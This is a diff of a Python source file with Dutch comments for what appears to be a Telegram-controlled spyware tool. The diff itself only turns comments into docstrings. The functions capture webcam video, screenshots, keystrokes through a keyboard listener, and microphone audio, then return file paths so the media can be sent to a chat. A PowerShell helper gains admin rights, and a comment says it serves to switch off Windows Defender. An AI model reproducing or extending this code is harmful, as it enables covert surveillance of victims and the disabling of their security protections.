@@ -7,16 +7,19 @@ from pynput import keyboard
 from atoms import *
 
 
-# gebruik make_banner() en zorg ervoor dat alle tekens te zien zijn
 def get_banner() -> str:
+    """
+    - import make_banner()
+    - en zorgt ervoor dat alle tekens uitgeprint kunnen worden
+    - return de banner
+    """
     text = make_banner()
     # re.sub zorgt ervoor dat speciale tekens te zien zijn in markdown codeblock
     return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', text)
 
-# functie die een lijst met alle commands terug geeft
 def get_command_list() -> str:
     """
-    Geeft een lijst met alle slash commands.
+    Geeft een lijst met alle slash commands die gebruikt kunnen worden
     """
     return r"""
 Command Lijst:
@@ -27,9 +30,13 @@ Command Lijst:
 /listen         -   maak een 5 seconde geluidsopname
 """
 
-# maak een video recording met de webcam
-# source: https://www.geeksforgeeks.org/python/python-opencv-capture-video-from-camera/
 def get_camRecording():
+    """
+    - Maak een 5 seconde webcam recording
+    - slaat de video op m.b.v save_media_to()
+    - return de path waar de video is opgeslagen
+    """
+    # source: https://www.geeksforgeeks.org/python/python-opencv-capture-video-from-camera/
     videoPath = save_media_to("cam", "mp4")
 
     # videoCapture functie: aangeven dat de webcam gebruikt moet/kan worden (camera met index 0)
@@ -66,16 +73,25 @@ def get_camRecording():
     # return de video filepath zodat we hierna weten welke video naar de telegram chat verstuurd moet worden
     return videoPath
 
-# Maak een screenshot van het scherm
 def get_screenshot():
+    """
+    - Maak een screenshot van het main scherm
+    - slaat de image op m.b.v save_media_to()
+    - return de path waar de image is opgeslagen
+    """
     imagePath = save_media_to("screenshot", "png")
     screenshot = ImageGrab.grab()
     screenshot.save(imagePath, "PNG")
 
     return imagePath
 
-# start keylogging. na enter maakt het een string van de lijst
 def get_loggedKeys():
+    """
+    - start een keyboard listener
+    - gebruikt log_a_string() om de keys in een list op te slaan
+    - haalt alle aanhalings tekens uit de list
+    - return een string van alle geklikte keys
+    """
     # Collect events until released
     with keyboard.Listener(on_press=log_a_string) as listener:
         listener.join()
@@ -88,8 +104,13 @@ def get_loggedKeys():
     # return een list zonder aanhalings tekens
     return send_string
 
-# https://www.geeksforgeeks.org/python/create-a-voice-recorder-using-python/
 def get_audioFile():
+    """
+    - Maak een 5 seconde voice recording
+    - slaat de audio file op m.b.v save_media_to()
+    - return de path waar de audio file is opgeslagen
+    """
+    # https://www.geeksforgeeks.org/python/create-a-voice-recorder-using-python/
     # Sampling frequency
     freq = 44100
 
@@ -110,8 +131,12 @@ def get_audioFile():
 
     return audioPath
 
-# windows defender uitzetten via python met powershell
 def run_powershell_command(cmd):
+    """
+    - gebruikt get_adminRights() om een powershell terminal met admin rechten op te starten
+    - cmd: is de command die binnen die powershel terminal uitgevoerd moet worden
+    - return is de resultaat van de powershell command die uitgevoerd is
+    """
     # zet admin rechten aan
     get_adminRights()
 
